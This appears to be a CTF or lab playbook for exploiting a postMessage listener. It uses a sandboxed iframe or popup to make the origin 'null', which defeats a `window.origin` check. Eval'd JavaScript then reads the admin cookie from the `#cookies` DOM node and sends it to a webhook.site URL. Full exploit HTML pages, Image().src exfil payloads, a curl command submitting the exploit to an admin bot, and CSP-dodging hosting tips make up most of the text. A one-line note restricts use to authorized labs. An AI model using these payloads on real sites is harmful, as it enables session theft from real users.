# postMessage Sandbox Null-Origin `#cookies` Exfil

## Context

Use when:

- a page has `window.onmessage` or `addEventListener('message', ...)`
- the listener checks `event.origin !== window.origin`
- the handler executes attacker-controlled data with `eval()` or a similar sink
- the secret is rendered server-side into a DOM node such as `#cookies`
- an admin/report bot can be sent to an attacker-hosted exploit URL

## Requirements

- Authorized lab, owned app, in-scope target, or defensive validation.
- Do not store live flags, cookies, tokens, or private webhook URLs in reusable files.

## Confirm Secret Location

```bash
curl -sS "https://[host]/" -H "Cookie: FLAG=test" | rg 'id="cookies"'
```

Expected pattern:

```html
<span id="cookies">FLAG=test</span>
```

If this works, prefer DOM exfil over `document.cookie`.

## Exfil Payload

```javascript
(new Image()).src='https://[webhook]?c=' + encodeURIComponent(document.getElementById('cookies').innerText)
```

Fallback if needed:

```javascript
(new Image()).src='https://[webhook]?c=' + encodeURIComponent(document.getElementById('cookies').textContent)
```

## Nested Sandbox Iframe Pattern

Good for proving the null-origin bypass:

```html
<!DOCTYPE html>
<html><body><script>
const EXFIL = 'https://webhook.site/[uuid]';
const TARGET = 'https://[host]/';
const msg = "(new Image()).src='" + EXFIL + "?c='+encodeURIComponent(document.getElementById('cookies').innerText)";

const outer = document.createElement('iframe');
outer.sandbox = 'allow-scripts';
const inner = [
  '<script>',
  "var f=document.createElement('iframe');",
  "f.sandbox='allow-scripts';",
  "f.src='" + TARGET + "';",
  "(document.body||document.documentElement).appendChild(f);",
  "setTimeout(function(){",
  "f.contentWindow.postMessage(" + JSON.stringify(msg) + ",'*');",
  "},10000);",
  '</scr','ipt>'
].join('');
outer.srcdoc = inner;
document.body.appendChild(outer);
</script></body></html>
```

## Sandbox Popup Pattern

Preferred when admin cookies are only present on top-level navigation:

```html
<!DOCTYPE html>
<html><body><script>
const EXFIL = 'https://webhook.site/[uuid]';
const TARGET = 'https://[host]/';
const msg = "(new Image()).src='" + EXFIL + "?c='+encodeURIComponent(document.getElementById('cookies').innerText)";

const outer = document.createElement('iframe');
outer.sandbox = 'allow-scripts allow-popups allow-modals allow-top-navigation';
const inner = [
  '<script>',
  "var w=open('" + TARGET + "');",
  "setTimeout(function(){",
  "if(w)w.postMessage(" + JSON.stringify(msg) + ",'*');",
  "},10000);",
  '</scr','ipt>'
].join('');
outer.srcdoc = inner;
document.body.appendChild(outer);
</script></body></html>
```

## Report To Admin Bot

```bash
curl -sS -X POST "https://[host]/report" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://[exploit-host]/exploit.html"}'
```

## Hosting Notes

Do not host the exploit on webhook.site if the response includes:

```http
Content-Security-Policy: script-src 'none'
```

Use instead:

```text
data: URL
localhost tunnel / self-hosted HTTP server
paste host that serves executable HTML
```

## Implementation Pitfalls

### `document.body` is null in `srcdoc`

Use:

```javascript
(document.body || document.documentElement).appendChild(f)
```

### Split closing script tag in `srcdoc`

Use:

```javascript
'</scr' + 'ipt>'
```

### Quote escaping in `postMessage` payload

Build with `JSON.stringify(msg)` when injecting into generated script strings.

### Exfil transport

Prefer:

```javascript
(new Image()).src = ...
```

over:

```javascript
fetch('https://[webhook]?c=...')
```

when testing sandboxed/null-origin execution.

## Expected Signals

```text
#output -> received
webhook query param c=flag=pwnbox{...} or FLAG=pwnbox{...}
iframe-only chain may return c=No cookies found even when bypass works
```

## Escalation Order

1. Find `postMessage` listener and origin check.
2. Test whether check uses `window.origin`.
3. Prove sandbox `null` origin bypass.
4. Identify whether secret is in `#cookies` or `document.cookie`.
5. Use nested iframe for bypass proof.
6. Switch to sandbox popup if admin cookies are missing in iframe.
7. Add 10-second delay before `postMessage`.
8. Exfil with `Image().src`.
9. Report exploit URL to admin bot.

## Why This Works

The listener accepts messages where `event.origin` and `window.origin` are both `"null"`. `eval(event.data)` then runs attacker JavaScript in the target context. If the server rendered the admin cookie into `#cookies`, the DOM read exposes the flag.

## Common Mistakes

- Reading `document.cookie` when the lab renders secrets into `#cookies`.
- Hosting exploit HTML on webhook.site.
- Forgetting the 10-second delay for bot labs.
- Using popup-free iframe only and getting `No cookies found`.
- Calling `appendChild` on `document.body` inside `srcdoc` before the body exists.
